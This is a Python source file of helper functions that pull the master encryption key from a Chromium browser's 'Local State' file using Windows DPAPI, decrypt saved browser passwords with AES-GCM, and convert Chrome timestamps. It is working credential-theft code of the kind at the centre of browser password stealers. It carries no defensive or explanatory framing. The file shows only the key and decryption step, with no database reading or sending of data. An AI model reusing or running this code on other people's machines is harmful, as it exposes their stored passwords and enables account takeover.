import os
import json
import base64
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from datetime import datetime, timedelta
import logging

def get_master_key(path: str):
    try:
        if not os.path.exists(path):
            logging.warning(f"Path does not exist: {path}")
            return None

        with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())

        key = base64.b64decode(local_state.get("os_crypt", {}).get("encrypted_key", ""))
        if len(key) < 5:
            logging.warning("Master key not found or invalid")
            return None
        
        key = key[5:]
        master_key = CryptUnprotectData(key, None, None, None, 0)[1]
        logging.info("Master key successfully retrieved")
        return master_key
    except Exception as e:
        logging.error(f"Error retrieving master key: {e}")
        return None

def decrypt_password(buff: bytes, key: bytes) -> str:
    try:
        if not buff or not key:
            return ""

        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        logging.info("Password decrypted successfully")
        return decrypted_pass
    except Exception as e:
        logging.error(f"Error decrypting password: {e}")
        return ""

def convert_chrome_time(chrome_time):
    try:
        if not chrome_time:
            return ""

        converted_time = (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
        logging.info("Chrome time converted successfully")
        return converted_time
    except Exception as e:
        logging.error(f"Error converting chrome time: {e}")
        return ""
